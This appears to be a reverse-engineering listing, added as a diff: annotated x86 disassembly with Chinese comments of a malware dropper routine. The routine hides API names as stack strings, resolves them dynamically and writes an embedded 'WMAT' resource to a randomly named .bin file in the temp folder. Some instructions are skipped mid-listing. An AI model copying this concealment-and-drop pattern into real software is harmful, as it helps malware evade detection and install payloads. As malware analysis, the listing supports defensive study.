@@ -1,0 +1,487 @@
+
+```
+00402605  /$  55                 push    ebp
+
+00402606  |.  8BEC               mov     ebp, esp
+
+00402608  |.  81EC C8010000      sub     esp, 1C8
+
+0040260E  |.  53                 push    ebx
+
+0040260F  |.  56                 push    esi
+
+00402610  |.  57                 push    edi
+
+00402611  |.  6A 40              push    40
+
+00402613  |.  33DB               xor     ebx, ebx
+
+00402615  |.  59                 pop     ecx                                         ;  ecx = 0x40
+
+00402616  |.  33C0               xor     eax, eax
+
+00402618  |.  8DBD 39FEFFFF      lea     edi, dword ptr [ebp-1C7]
+
+0040261E  |.  889D 38FEFFFF      mov     byte ptr [ebp-1C8], bl
+
+00402624  |.  8B35 00604000      mov     esi, dword ptr [<&kernel32.LoadLibraryA>]   ;  kernel32.LoadLibraryA
+
+0040262A  |.  F3:AB              rep     stos dword ptr es:[edi]
+
+0040262C  |.  66:AB              stos    word ptr es:[edi]
+
+0040262E  |.  AA                 stos    byte ptr es:[edi]
+
+0040262F  |.  8D45 F0            lea     eax, dword ptr [ebp-10]
+
+00402632  |.  C645 E4 43         mov     byte ptr [ebp-1C], 43
+
+00402636  |.  50                 push    eax                                         ; /FileName
+
+00402637  |.  C645 E5 72         mov     byte ptr [ebp-1B], 72                       ; |填充内容CreateFile
+
+0040263B  |.  C645 E6 65         mov     byte ptr [ebp-1A], 65                       ; |
+
+0040263F  |.  C645 E7 61         mov     byte ptr [ebp-19], 61                       ; |
+
+00402643  |.  C645 E8 74         mov     byte ptr [ebp-18], 74                       ; |
+
+00402647  |.  C645 E9 65         mov     byte ptr [ebp-17], 65                       ; |
+
+0040264B  |.  C645 EA 46         mov     byte ptr [ebp-16], 46                       ; |
+
+0040264F  |.  C645 EB 69         mov     byte ptr [ebp-15], 69                       ; |
+
+00402653  |.  C645 EC 6C         mov     byte ptr [ebp-14], 6C                       ; |
+
+00402657  |.  C645 ED 65         mov     byte ptr [ebp-13], 65                       ; |
+
+0040265B  |.  C645 EE 41         mov     byte ptr [ebp-12], 41                       ; |
+
+0040265F  |.  885D EF            mov     byte ptr [ebp-11], bl                       ; |
+
+00402662  |.  C645 F0 4B         mov     byte ptr [ebp-10], 4B                       ; |填充内容kernel32.dll
+
+00402666  |.  C645 F1 65         mov     byte ptr [ebp-F], 65                        ; |
+
+0040266A  |.  C645 F2 72         mov     byte ptr [ebp-E], 72                        ; |
+
+0040266E  |.  C645 F3 6E         mov     byte ptr [ebp-D], 6E                        ; |
+
+00402672  |.  C645 F4 65         mov     byte ptr [ebp-C], 65                        ; |
+
+00402676  |.  C645 F5 6C         mov     byte ptr [ebp-B], 6C                        ; |
+
+0040267A  |.  C645 F6 33         mov     byte ptr [ebp-A], 33                        ; |
+
+0040267E  |.  C645 F7 32         mov     byte ptr [ebp-9], 32                        ; |
+
+00402682  |.  C645 F8 2E         mov     byte ptr [ebp-8], 2E                        ; |
+
+00402686  |.  C645 F9 64         mov     byte ptr [ebp-7], 64                        ; |
+
+0040268A  |.  C645 FA 6C         mov     byte ptr [ebp-6], 6C                        ; |
+
+0040268E  |.  C645 FB 6C         mov     byte ptr [ebp-5], 6C                        ; |
+
+00402692  |.  885D FC            mov     byte ptr [ebp-4], bl                        ; |
+
+00402695  |.  FFD6               call    esi                                         ; \LoadLibraryA Kernel32.dll
+
+00402697  |.  8BF8               mov     edi, eax
+
+00402699  |.  3BFB               cmp     edi, ebx
+
+0040269B  |.  0F84 6B030000      je      00402A0C                                    ;  判断加载是否成功
+
+004026A1  |.  8D45 A4            lea     eax, dword ptr [ebp-5C]
+
+004026A4  |.  C645 A4 47         mov     byte ptr [ebp-5C], 47
+
+004026A8  |.  50                 push    eax
+
+004026A9  |.  57                 push    edi
+
+004026AA  |.  C645 A5 65         mov     byte ptr [ebp-5B], 65                       ;  填充GetTempPathA
+
+004026AE  |.  C645 A6 74         mov     byte ptr [ebp-5A], 74
+
+004026B2  |.  C645 A7 54         mov     byte ptr [ebp-59], 54
+
+004026B6  |.  C645 A8 65         mov     byte ptr [ebp-58], 65
+
+004026BA  |.  C645 A9 6D         mov     byte ptr [ebp-57], 6D
+
+004026BE  |.  C645 AA 70         mov     byte ptr [ebp-56], 70
+
+004026C2  |.  C645 AB 50         mov     byte ptr [ebp-55], 50
+
+004026C6  |.  C645 AC 61         mov     byte ptr [ebp-54], 61
+
+004026CA  |.  C645 AD 74         mov     byte ptr [ebp-53], 74
+
+004026CE  |.  C645 AE 68         mov     byte ptr [ebp-52], 68
+
+004026D2  |.  C645 AF 41         mov     byte ptr [ebp-51], 41
+
+004026D6  |.  885D B0            mov     byte ptr [ebp-50], bl
+
+004026D9  |.  E8 53F2FFFF        call    00401931                                    ;  GetProcAddress GetTempPathA
+
+004026DE  |.  59                 pop     ecx
+
+004026DF  |.  59                 pop     ecx
+
+004026E0  |.  8D8D 38FEFFFF      lea     ecx, dword ptr [ebp-1C8]
+
+004026E6  |.  51                 push    ecx                                         ;  Buffer
+
+004026E7  |.  68 04010000        push    104                                         ;  length = 0x104
+
+004026EC  |.  FFD0               call    eax
+
+004026EE  |.  85C0               test    eax, eax
+
+004026F0  |.  0F84 16030000      je      00402A0C                                    ;  判断是否成功获取系统临时文件夹
+
+004026F6  |.  8D45 94            lea     eax, dword ptr [ebp-6C]
+
+004026F9  |.  C645 94 46         mov     byte ptr [ebp-6C], 46
+
+004026FD  |.  50                 push    eax
+
+004026FE  |.  57                 push    edi
+
+004026FF  |.  C645 95 69         mov     byte ptr [ebp-6B], 69                       ;  填充FindResourceA
+
+00402806  |.  E8 26F1FFFF        call    00401931                                    ;  GetProcAddress FindResourceA
+
+0040280B  |.  8985 5CFFFFFF      mov     dword ptr [ebp-A4], eax
+
+00402811  |.  8D45 84            lea     eax, dword ptr [ebp-7C]
+
+00402814  |.  50                 push    eax
+
+00402815  |.  57                 push    edi
+
+00402816  |.  E8 16F1FFFF        call    00401931                                    ;  GetProcAddress SizeofResource
+
+0040281B  |.  8985 64FFFFFF      mov     dword ptr [ebp-9C], eax
+
+00402821  |.  8D45 B4            lea     eax, dword ptr [ebp-4C]
+
+00402824  |.  50                 push    eax
+
+00402825  |.  57                 push    edi
+
+00402826  |.  E8 06F1FFFF        call    00401931                                    ;  GetProcAddress LoadResource
+
+0040282B  |.  8985 60FFFFFF      mov     dword ptr [ebp-A0], eax
+
+00402831  |.  8D45 C4            lea     eax, dword ptr [ebp-3C]
+
+00402834  |.  50                 push    eax
+
+00402835  |.  57                 push    edi
+
+00402836  |.  E8 F6F0FFFF        call    00401931                                    ;  GetProcAddress LockResource
+
+0040283B  |.  8985 74FFFFFF      mov     dword ptr [ebp-8C], eax
+
+00402841  |.  8D45 D4            lea     eax, dword ptr [ebp-2C]
+
+00402844  |.  50                 push    eax
+
+00402845  |.  57                 push    edi
+
+00402846  |.  E8 E6F0FFFF        call    00401931                                    ;  GetProcAddress FreeResource
+
+0040284B  |.  6A 07              push    7
+
+0040284D  |.  8985 68FFFFFF      mov     dword ptr [ebp-98], eax
+
+00402853  |.  59                 pop     ecx                                         ;  ecx = 7
+
+00402854  |.  33C0               xor     eax, eax
+
+00402856  |.  8DBD 3DFFFFFF      lea     edi, dword ptr [ebp-C3]
+
+0040285C  |.  53                 push    ebx                                         ; /timer
+
+0040285D  |.  F3:AB              rep     stos dword ptr es:[edi]                     ; |
+
+0040285F  |.  66:AB              stos    word ptr es:[edi]                           ; |
+
+00402861  |.  AA                 stos    byte ptr es:[edi]                           ; |
+
+00402862  |.  C685 3CFFFFFF 6B   mov     byte ptr [ebp-C4], 6B                       ; |ebp - c4 是一char数组的首地址，这里是给前两个char填充内容kb
+
+00402869  |.  C685 3DFFFFFF 62   mov     byte ptr [ebp-C3], 62                       ; |
+
+00402870  |.  FF15 90604000      call    dword ptr [<&MSVCRT.time>]                  ; \time
+
+00402876  |.  50                 push    eax                                         ; /seed
+
+00402877  |.  FF15 8C604000      call    dword ptr [<&MSVCRT.srand>]                 ; \以当前时间作为种子取随即数
+
+0040287D  |.  83C4 30            add     esp, 30
+
+00402880  |.  6A 02              push    2
+
+00402882  |.  5F                 pop     edi                                         ;  下面10句指令是一个小循环，给char数组的3~6位填充内容，范围1~9
+
+00402883  |>  FF15 88604000      /call    dword ptr [<&MSVCRT.rand>]                 ; [rand
+
+00402889  |.  6A 0A              |push    0A
+
+0040288B  |.  99                 |cdq
+
+0040288C  |.  59                 |pop     ecx                                        ;  ecx = 0x0a
+
+0040288D  |.  F7F9               |idiv    ecx                                        ;  eax = rand() / 0x0A  则 dl = 0 ~ 9
+
+0040288F  |.  80C2 30            |add     dl, 30                                     ;  把dl加上0x30 则转换为相对应的ascii 码
+
+00402892  |.  88943D 3CFFFFFF    |mov     byte ptr [ebp+edi-C4], dl                  ;  把值赋予int 数组
+
+00402899  |.  47                 |inc     edi                                        ;  下标加一
+
+0040289A  |.  83FF 06            |cmp     edi, 6
+
+0040289D  |.^ 7C E4              \jl      short 00402883                             ;  循环
+
+0040289F  |.  C6843D 3CFFFFFF 2E mov     byte ptr [ebp+edi-C4], 2E                   ;  在char数组后添加元素0x2E '.'
+
+004028A7  |.  47                 inc     edi
+
+004028A8  |.  8D85 3CFFFFFF      lea     eax, dword ptr [ebp-C4]                     ;  数组地址
+
+004028AE  |.  C6843D 3CFFFFFF 62 mov     byte ptr [ebp+edi-C4], 62                   ;  在char数组后添加元素0x62 'b'
+
+004028B6  |.  47                 inc     edi                                         ;  下标加一
+
+004028B7  |.  50                 push    eax
+
+004028B8  |.  8D85 38FEFFFF      lea     eax, dword ptr [ebp-1C8]                    ;  eax = 临时文件目录
+
+004028BE  |.  C6843D 3CFFFFFF 69 mov     byte ptr [ebp+edi-C4], 69                   ;  在char数组后添加元素0x69 'i'
+
+004028C6  |.  47                 inc     edi
+
+004028C7  |.  50                 push    eax
+
+004028C8  |.  C6843D 3CFFFFFF 6E mov     byte ptr [ebp+edi-C4], 6E                   ;  在char数组后添加元素0x6E 'n'
+
+004028D0  |.  889C3D 3DFFFFFF    mov     byte ptr [ebp+edi-C3], bl                   ;  在最后补0
+
+004028D7  |.  E8 69EEFFFF        call    00401745                                    ;  获取系统临时文件路径，在路径后追加刚刚随即生成的文件名的.bin
+
+004028DC  |.  8D85 38FEFFFF      lea     eax, dword ptr [ebp-1C8]
+
+004028E2  |.  50                 push    eax                                         ;  压入文件绝对路径
+
+004028E3  |.  FF75 08            push    dword ptr [ebp+8]                           ;  压入buffer 指针
+
+004028E6  |.  E8 63EDFFFF        call    0040164E                                    ;  此函数把生成的文件绝对路径复制到堆空间中
+
+004028EB  |.  83C4 10            add     esp, 10
+
+004028EE  |.  899D 70FFFFFF      mov     dword ptr [ebp-90], ebx
+
+004028F4  |.  53                 push    ebx                                         ; /pModule
+
+004028F5  |.  FF15 04604000      call    dword ptr [<&kernel32.GetModuleHandleA>]    ; \获取当前进程的HMODULE
+
+004028FB  |.  FF75 0C            push    dword ptr [ebp+C]                           ;  "WMAT"
+
+004028FE  |.  8BF8               mov     edi, eax
+
+00402900  |.  FF75 10            push    dword ptr [ebp+10]                          ;  0x75
+
+00402903  |.  57                 push    edi
+
+00402904  |.  FF95 5CFFFFFF      call    dword ptr [ebp-A4]                          ;  FindResourceA 获取名为WMAT的资源
+
+0040290A  |.  8945 08            mov     dword ptr [ebp+8], eax
+
+0040290D  |.  50                 push    eax
+
+0040290E  |.  58                 pop     eax
+
+0040290F  |.  395D 08            cmp     dword ptr [ebp+8], ebx
+
+00402912  |.  0F84 F4000000      je      00402A0C                                    ;  判断是否为NULL
+
+00402918  |.  FF75 08            push    dword ptr [ebp+8]                           ;  压入WMAT资源首地址
+
+0040291B  |.  57                 push    edi                                         ;  压入模块基址
+
+0040291C  |.  FF95 60FFFFFF      call    dword ptr [ebp-A0]                          ;  LoadResource 加载资源到全局空间
+
+00402922  |.  3BC3               cmp     eax, ebx
+
+00402924  |.  8945 0C            mov     dword ptr [ebp+C], eax
+
+00402927  |.  0F84 DF000000      je      00402A0C                                    ;  判断LoadResource是否成功
+
+0040292D  |.  50                 push    eax                                         ;  传入资源的内存地址
+
+0040292E  |.  FF95 74FFFFFF      call    dword ptr [ebp-8C]                          ;  SetHandleCount 这个地方应该是传参错误，不过没什么影响
+
+00402934  |.  3BC3               cmp     eax, ebx
+
+00402936  |.  8985 74FFFFFF      mov     dword ptr [ebp-8C], eax
+
+0040293C  |.  0F84 D8000000      je      00402A1A                                    ;  判断SetHandleCount结果
+
+00402942  |.  FF75 08            push    dword ptr [ebp+8]                           ;  资源地址
+
+00402945  |.  57                 push    edi                                         ;  HMODULE
+
+00402946  |.  FF95 64FFFFFF      call    dword ptr [ebp-9C]                          ;  SizeofResource 获取资源大小
+
+0040294C  |.  8945 10            mov     dword ptr [ebp+10], eax                     ;  大小为0x5200
+
+0040294F  |.  8D45 E4            lea     eax, dword ptr [ebp-1C]                     ;  eax = "CreateFileA"
+
+00402952  |.  50                 push    eax
+
+00402953  |.  8D45 F0            lea     eax, dword ptr [ebp-10]                     ;  eax = "Kernel32.dll"
+
+00402956  |.  50                 push    eax
+
+00402957  |.  FFD6               call    esi                                         ;  LoadLibraryA Kernel32.dll
+
+00402959  |.  50                 push    eax
+
+0040295A  |.  E8 D2EFFFFF        call    00401931                                    ;  GetProcAddress 获取CreateFileA函数地址
+
+0040295F  |.  59                 pop     ecx
+
+00402960  |.  8BF8               mov     edi, eax
+
+00402962  |.  59                 pop     ecx
+
+00402963  |.  8D85 78FFFFFF      lea     eax, dword ptr [ebp-88]
+
+00402969  |.  50                 push    eax                                         ;  先压入地址，然后再填充其内容
+
+0040296A  |.  8D45 F0            lea     eax, dword ptr [ebp-10]
+
+0040296D  |.  50                 push    eax
+
+0040296E  |.  C685 78FFFFFF 43   mov     byte ptr [ebp-88], 43                       ;  填充的内容为CloseHandle
+
+00402975  |.  C685 79FFFFFF 6C   mov     byte ptr [ebp-87], 6C
+
+0040297C  |.  C685 7AFFFFFF 6F   mov     byte ptr [ebp-86], 6F
+
+00402983  |.  C685 7BFFFFFF 73   mov     byte ptr [ebp-85], 73
+
+0040298A  |.  C685 7CFFFFFF 65   mov     byte ptr [ebp-84], 65
+
+00402991  |.  C685 7DFFFFFF 48   mov     byte ptr [ebp-83], 48
+
+00402998  |.  C685 7EFFFFFF 61   mov     byte ptr [ebp-82], 61
+
+0040299F  |.  C685 7FFFFFFF 6E   mov     byte ptr [ebp-81], 6E
+
+004029A6  |.  C645 80 64         mov     byte ptr [ebp-80], 64
+
+004029AA  |.  C645 81 6C         mov     byte ptr [ebp-7F], 6C
+
+004029AE  |.  C645 82 65         mov     byte ptr [ebp-7E], 65
+
+004029B2  |.  885D 83            mov     byte ptr [ebp-7D], bl
+
+004029B5  |.  FFD6               call    esi                                         ;  LoadLibraryA Kernel32.dll
+
+004029B7  |.  50                 push    eax
+
+004029B8  |.  E8 74EFFFFF        call    00401931                                    ;  GetProcAddress CloseHandle
+
+004029BD  |.  59                 pop     ecx
+
+004029BE  |.  8945 08            mov     dword ptr [ebp+8], eax
+
+004029C1  |.  59                 pop     ecx
+
+004029C2  |.  8D85 38FEFFFF      lea     eax, dword ptr [ebp-1C8]
+
+004029C8  |.  53                 push    ebx                                         ;  0
+
+004029C9  |.  53                 push    ebx                                         ;  0
+
+004029CA  |.  6A 02              push    2
+
+004029CC  |.  53                 push    ebx                                         ;  0
+
+004029CD  |.  53                 push    ebx                                         ;  0
+
+004029CE  |.  68 000000C0        push    C0000000
+
+004029D3  |.  50                 push    eax                                         ;  文件的绝对路径 文件名kb****.bin *的范围0~9
+
+004029D4  |.  FFD7               call    edi                                         ;  CreateFileA
+
+004029D6  |.  8BF0               mov     esi, eax
+
+004029D8  |.  83FE FF            cmp     esi, -1
+
+004029DB  |.  74 39              je      short 00402A16                              ;  判断创建文件是否成功
+
+004029DD  |.  8D85 6CFFFFFF      lea     eax, dword ptr [ebp-94]
+
+004029E3  |.  53                 push    ebx                                         ; /pOverlapped
+
+004029E4  |.  50                 push    eax                                         ; |pBytesWritten
+
+004029E5  |.  FF75 10            push    dword ptr [ebp+10]                          ; |nBytesToWrite
+
+004029E8  |.  FFB5 74FFFFFF      push    dword ptr [ebp-8C]                          ; |资源地址
+
+004029EE  |.  56                 push    esi                                         ; |hFile
+
+004029EF  |.  FF15 10604000      call    dword ptr [<&kernel32.WriteFile>]           ; \WriteFile 把资源文件转存到创建的文件中
+
+004029F5  |.  3BC3               cmp     eax, ebx
+
+004029F7  |.  8985 70FFFFFF      mov     dword ptr [ebp-90], eax
+
+004029FD  |.  56                 push    esi
+
+004029FE  |.  75 10              jnz     short 00402A10                              ;  写入成功则跳转
+
+00402A00  |.  FF55 08            call    dword ptr [ebp+8]                           ;  否则CloseHandle
+
+00402A03  |.  FF75 0C            push    dword ptr [ebp+C]                           ;  压入资源地址
+
+00402A06  |.  FF95 68FFFFFF      call    dword ptr [ebp-98]                          ;  FreeResource 释放资源 此API已废弃
+
+00402A0C  |>  33C0               xor     eax, eax
+
+00402A0E  |.  EB 19              jmp     short 00402A29
+
+00402A10  |>  FF15 0C604000      call    dword ptr [<&kernel32.FlushFileBuffers>]    ; \完成写入操作
+
+00402A16  |>  56                 push    esi
+
+00402A17  |.  FF55 08            call    dword ptr [ebp+8]                           ;  CloseHandle 关闭文件handle
+
+00402A1A  |>  FF75 0C            push    dword ptr [ebp+C]
+
+00402A1D  |.  FF95 68FFFFFF      call    dword ptr [ebp-98]                          ;  FreeResource 释放资源
+
+00402A23  |.  8B85 70FFFFFF      mov     eax, dword ptr [ebp-90]
+
+00402A29  |>  5F                 pop     edi
+
+00402A2A  |.  5E                 pop     esi
+
+00402A2B  |.  5B                 pop     ebx
+
+00402A2C  |.  C9                 leave
+
+00402A2D  \.  C3                 retn
+
+```
